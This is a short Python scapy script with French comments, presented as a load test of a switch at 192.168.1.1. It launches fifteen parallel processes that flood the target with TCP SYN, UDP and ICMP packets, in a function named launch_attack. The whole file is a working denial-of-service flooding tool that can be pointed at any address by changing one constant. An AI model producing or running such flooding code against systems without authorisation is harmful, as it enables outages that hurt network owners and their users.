from scapy.all import *
import multiprocessing
import time

# Paramètres du test
TARGET_IP = "192.168.1.1"  # Adresse IP du switch ou d'un hôte derrière
PORT = 80  # Port cible pour le trafic TCP/UDP
PACKETS_PER_PROCESS = 10000  # Nombre de paquets envoyés par process
NUM_PROCESSES = 5  # Nombre de processus pour générer du trafic en parallèle


# Fonction pour envoyer des paquets TCP
def send_tcp_flood():
    packet = IP(dst=TARGET_IP) / TCP(dport=PORT, flags="S") / Raw(load="TCP TEST")
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)


# Fonction pour envoyer des paquets UDP
def send_udp_flood():
    packet = IP(dst=TARGET_IP) / UDP(dport=PORT) / Raw(load="UDP TEST")
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)


# Fonction pour envoyer des pings (ICMP)
def send_icmp_flood():
    packet = IP(dst=TARGET_IP) / ICMP() / Raw(load="PING TEST")
    send(packet, count=PACKETS_PER_PROCESS, inter=0.0001, verbose=False)


# Lancer plusieurs processus en parallèle
def launch_attack():
    processes = []

    for _ in range(NUM_PROCESSES):
        processes.append(multiprocessing.Process(target=send_tcp_flood))
        processes.append(multiprocessing.Process(target=send_udp_flood))
        processes.append(multiprocessing.Process(target=send_icmp_flood))

    # Démarrer les processus
    for process in processes:
        process.start()

    # Attendre que tous les processus se terminent
    for process in processes:
        process.join()


if __name__ == "__main__":
    print("🚀 Démarrage du test de charge...")
    start_time = time.time()
    launch_attack()
    print(f"✅ Test terminé en {time.time() - start_time:.2f} secondes")
